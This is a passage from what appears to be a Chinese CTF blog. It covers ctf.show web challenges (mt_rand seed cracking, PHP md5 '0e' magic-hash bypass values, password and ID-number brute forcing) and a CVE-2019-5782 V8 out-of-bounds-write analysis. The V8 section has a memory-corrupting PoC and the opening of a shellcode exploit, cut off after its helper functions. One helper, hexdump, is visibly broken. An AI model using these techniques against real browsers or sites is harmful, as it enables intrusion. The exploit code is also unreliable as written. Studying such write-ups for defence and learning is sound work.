2022</span><br></code></pre></td></tr></table></figure><p>先输入0然后得到第一个伪随机数，接着利用phpmtseed推出可能的seed</p><p><img src="image-20220402221245889.png" alt="image-20220402221245889"></p><p>一个个测试即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">3496916371</span>);<br><span class="hljs-keyword">echo</span> intval(mt_rand()),<span class="hljs-string">&#x27;\n&#x27;</span>;<br><span class="hljs-keyword">echo</span> intval(mt_rand()+mt_rand())<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="image-20220402221256864.png" alt="image-20220402221256864"></p><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p><img src="image-20220402222302266.png" alt="image-20220402222302266"></p><p>爆数据库密码</p><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p><img src="image-20220402222509702.png" alt="image-20220402222509702"></p><p>这个很眼熟。。。</p><p><img src="image-20220402222634530.png" alt="image-20220402222634530"></p><p>但和南邮没太多关系。根据录取名单爆身份证号就行。</p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>看了hint才知道去掉2.txt</p><p>爆目录和前面大同小异，主要是熟悉下工具使用</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>v1=QNKCDZO&amp;v2=240610708</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;?php<br>error_reporting(0);<br>    <br>?&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ctf.show_web5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ctf.show_web5<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    &lt;?php<br>        $flag=&quot;&quot;;<br>        $v1=$_GET[&#x27;v1&#x27;];<br>        $v2=$_GET[&#x27;v2&#x27;];<br>        if(isset($v1) &amp;&amp; isset($v2))&#123;<br>            if(!ctype_alpha($v1))&#123;<br>                die(&quot;v1 error&quot;);<br>            &#125;<br>            if(!is_numeric($v2))&#123;<br>                die(&quot;v2 error&quot;);<br>            &#125;<br>            if(md5($v1)==md5($v2))&#123;<br>                echo $flag;<br>            &#125;<br>        &#125;else&#123;<br>        <br>            echo &quot;where is flag?&quot;;<br>        &#125;<br>    ?&gt;<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>md5绕过</p><p>==只判断值是否相等，若两个变量的类型不相等，则会转化为相同类型后再进行比较。</p><p>PHP在处理哈希字符串的时候，它把每一个<strong>以0e开头并且后面字符均为纯数字的哈希值</strong>都解析为0。科学计数法</p><p>在md5加密后以0E开头</p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cve-2019-5782</title>
    <link href="/2022/03/24/cve-2019-5782/"/>
    <url>/2022/03/24/cve-2019-5782/</url>
    
    <content type="html"><![CDATA[<p>V8数组越界的洞，简单写下漏洞分析。</p><a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset --hard b474b3102bd4a95eafcdb68e0e44656046132bc9<br>gclient sync<br>tools/dev/v8gen.py x64.debug<br>ninja -C out.gn/x64.debug<br></code></pre></td></tr></table></figure><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><p>之前是参考<a href="https://gtoad.github.io/2019/09/01/V8-CVE-2019-5782/">https://gtoad.github.io/2019/09/01/V8-CVE-2019-5782/</a></p><p>来复现的。</p><p>漏洞详情见<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043">https://bugs.chromium.org/p/chromium/issues/detail?id=906043</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// Flags: --allow-natives-syntax</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params">arg</span>) </span>&#123;<br>  <span class="hljs-keyword">let</span> x = <span class="hljs-built_in">arguments</span>.length;<br>  a1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">0x10</span>);<br>  a1[<span class="hljs-number">0</span>] = <span class="hljs-number">1.1</span>;<br>  a2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">0x10</span>);<br>  a2[<span class="hljs-number">0</span>] = <span class="hljs-number">1.1</span>;<br>  a1[(x &gt;&gt; <span class="hljs-number">16</span>) * <span class="hljs-number">21</span>] = <span class="hljs-number">1.39064994160909e-309</span>;  <span class="hljs-comment">// 0xffff00000000</span><br>  a1[(x &gt;&gt; <span class="hljs-number">16</span>) * <span class="hljs-number">41</span>] = <span class="hljs-number">8.91238232205e-313</span>;  <span class="hljs-comment">// 0x2a00000000</span><br>&#125;<br><span class="hljs-keyword">var</span> a1, a2;<br><span class="hljs-keyword">var</span> a3 = [<span class="hljs-number">1.1</span>,<span class="hljs-number">2.2</span>];<br>a3.length = <span class="hljs-number">0x11000</span>;<br>a3.fill(<span class="hljs-number">3.3</span>);<br><span class="hljs-keyword">var</span> a4 = [<span class="hljs-number">1.1</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) fun(...a4);<br><span class="hljs-comment">// %OptimizeFunctionOnNextCall(fun);</span><br>fun(...a3);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; a2.length; i++)&#123;<br>    <span class="hljs-built_in">console</span>.log(a2[i]);<br>&#125;<br><span class="hljs-built_in">console</span>.log(a2.length);<br></code></pre></td></tr></table></figure><p>可以发现输出后a2的length发生了改变</p><p>调试可以看在执行fun(…a3);前内存布局如下</p><p>a1 elements后跟着a1结构体然后是a2 elements</p><p><img src="image-20220324180828823.png" alt="image-20220324180828823"></p><p>fun(…a3);执行后如下</p><p><img src="image-20220324181439088.png" alt="image-20220324181439088"></p><p>可以看到a2的elements length和自身length被修改</p><p>再看看poc</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">a1[(x &gt;&gt; <span class="hljs-number">16</span>) * <span class="hljs-number">21</span>] = <span class="hljs-number">1.39064994160909e-309</span>;  <span class="hljs-comment">// 0xffff00000000</span><br>a1[(x &gt;&gt; <span class="hljs-number">16</span>) * <span class="hljs-number">41</span>] = <span class="hljs-number">8.91238232205e-313</span>;  <span class="hljs-comment">// 0x2a00000000</span><br></code></pre></td></tr></table></figure><p>所以问题出在a1存在一个越界写，因为不能越界写a1的elements length只好在下面布局一个array然后使其长度增大进而实现任意地址读写。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>因为可以借助a1来扩大a2length来越界读写，利用也相对明了起来</p><p>和之前利用类似，先申请一个Array和f函数然后通过a2的越界读写来leak地址通过覆写array的backingstore来leak出f函数code地址然后再次覆写写入shellcode调用函数实现利用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d2u</span>(<span class="hljs-params">num1,num2</span>)</span>&#123;<br>  d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(<span class="hljs-number">2</span>);<br>  d[<span class="hljs-number">0</span>] = num1;<br>  d[<span class="hljs-number">1</span>] = num2;<br>  float = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(d.buffer);<br>  <span class="hljs-keyword">return</span> float[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-built_in">String</span>.prototype.padLeft =<br><span class="hljs-built_in">Number</span>.prototype.padLeft = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">total, pad</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-built_in">Array</span>(total).join(pad || <span class="hljs-number">0</span>) + <span class="hljs-built_in">this</span>).slice(-total);<br>&#125;<br><br><span class="hljs-comment">// Return the binary data represented by the given hexdecimal string.</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unhexlify</span>(<span class="hljs-params">hexstr</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (hexstr.length % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">&quot;Invalid hex string&quot;</span>);<br><br>  <span class="hljs-keyword">var</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(hexstr.length / <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; hexstr.length; i += <span class="hljs-number">2</span>)<br>      bytes[i/<span class="hljs-number">2</span>] = <span class="hljs-built_in">parseInt</span>(hexstr.substr(i, <span class="hljs-number">2</span>), <span class="hljs-number">16</span>);<br><br>  <span class="hljs-keyword">return</span> bytes;<br>&#125;<br><br><span class="hljs-comment">// Return the hexadecimal representation of the given byte array.</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hexlify</span>(<span class="hljs-params">bytes</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> res = [];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; bytes.length; i++)&#123;<br>      <span class="hljs-comment">//console.log(bytes[i].toString(16));</span><br>      res.push((<span class="hljs-string">&#x27;0&#x27;</span> + bytes[i].toString(<span class="hljs-number">16</span>)).substr(-<span class="hljs-number">2</span>));<br>  &#125;<br>  <span class="hljs-keyword">return</span> res.join(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hexdump</span>(<span class="hljs-params">data</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="hljs-string">&#x27;undefined&#x27;</span>)<br>      data = <span class="hljs-built_in">Array</span>.from(data);<br><br>  <span class="hljs-keyword">var</span> lines = [];<br>      <span class="hljs-keyword">var</span> chunk = data.slice(i, i+<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; data.length; i += <span class="hljs-number">16</span>) &#123;<br>      <span class="hljs-keyword">var</span> parts = chunk.map(hex);<br>      <span class="hljs-keyword">if</span> (parts.length &gt; <span class="hljs-number">8</span>)<br>          parts.splice(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27; &#x27;</span>);<br>      lines.push(parts.join(<span class="hljs-string">&#x27; &#x27;</span>));<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> lines.join(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-comment">// Simplified version of the similarly named python module.</span><br><span class="hljs-keyword">var</span> Struct = (<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span><br>  <span class="hljs-keyword">var</span> buffer      = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> byteView    = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(buffer);<br>  <span class="hljs-keyword">var</span> uint32View  = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(buffer);<br>  <span class="hljs-keyword">var</span> float64View = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(buffer);<br><br>  <span class="hljs-keyword">return</span> &#123;<br>      pack: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">type, value</span>) </span>&#123;<br>          <span class="hljs-keyword">var</span> view = type;        <span class="hljs-comment">// See below</span><br>          view[<span class="hljs-number">0</span>] = value;<br>          <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(buffer, <span class="hljs-number">0</span>, type.BYTES_PER_ELEMENT);<br>      &#125;,<br><br>      unpack: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">type, bytes</span>) </span>&#123;<br>          <span class="hljs-keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)<br>              <span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Invalid bytearray&quot;</span>);<br><br>          <span class="hljs-keyword">var</span> view = type;        <span class="hljs-comment">// See below</span><br>          byteView.set(bytes);<br>          <span class="hljs-keyword">return</span> view[<span class="hljs-number">0</span>];<br>      &#125;,<br><br>      <span class="hljs-comment">// Available types.</span><br>      int8:    byteView,<br>      int32:   uint32View,<br>      float64: float64View<br>  &#125;;<br>&#125;)();<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Int64</span>(<span class="hljs-params">v</span>) </span>&#123;<br>  <span class="hljs-comment">// The underlying byte array.</span><br>  <span class="hljs-keyword">var</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(<span class="hljs-number">8</span>);<br><br>  <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">typeof</span> v) &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;number&#x27;</span>:<br>          v = <span class="hljs-string">&#x27;0x&#x27;</span> + <span class="hljs-built_in">Math</span>.floor(v).toString(<span class="hljs-number">16</span>);<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;string&#x27;</span>:<br>          <span class="hljs-keyword">if</span> (v.startsWith(<span class="hljs-string">&#x27;0x&#x27;</span>))<br>              v = v.substr(<span class="hljs-number">2</span>);<br>          <span class="hljs-keyword">if</span> (v.length % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)<br>              v = <span class="hljs-string">&#x27;0&#x27;</span> + v;<br><br>          <span class="hljs-keyword">var</span> bigEndian = unhexlify(v, <span class="hljs-number">8</span>);<br>          <span class="hljs-comment">//console.log(bigEndian.toString());</span><br>          bytes.set(<span class="hljs-built_in">Array</span>.from(bigEndian).reverse());<br>          <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;object&#x27;</span>:<br>          <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> Int64) &#123;<br>              bytes.set(v.bytes());<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>              <span class="hljs-keyword">if</span> (v.length != <span class="hljs-number">8</span>)<br>                  <span class="hljs-keyword">throw</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">&quot;Array must have excactly 8 elements.&quot;</span>);<br>              bytes.set(v);<br>          &#125;<br>          <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;undefined&#x27;</span>:<br>          <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>          <span class="hljs-keyword">throw</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">&quot;Int64 constructor requires an argument.&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// Return a double whith the same underlying bit representation.</span><br>  <span class="hljs-built_in">this</span>.asDouble = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-comment">// Check for NaN</span><br>      <span class="hljs-keyword">if</span> (bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0xff</span> &amp;&amp; (bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xff</span> || bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xfe</span>))<br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RangeError</span>(<span class="hljs-string">&quot;Integer can not be represented by a double&quot;</span>);<br><br>      <span class="hljs-keyword">return</span> Struct.unpack(Struct.float64, bytes);<br>  &#125;;<br><br>  <span class="hljs-comment">// Return a javascript value with the same underlying bit representation.</span><br>  <span class="hljs-comment">// This 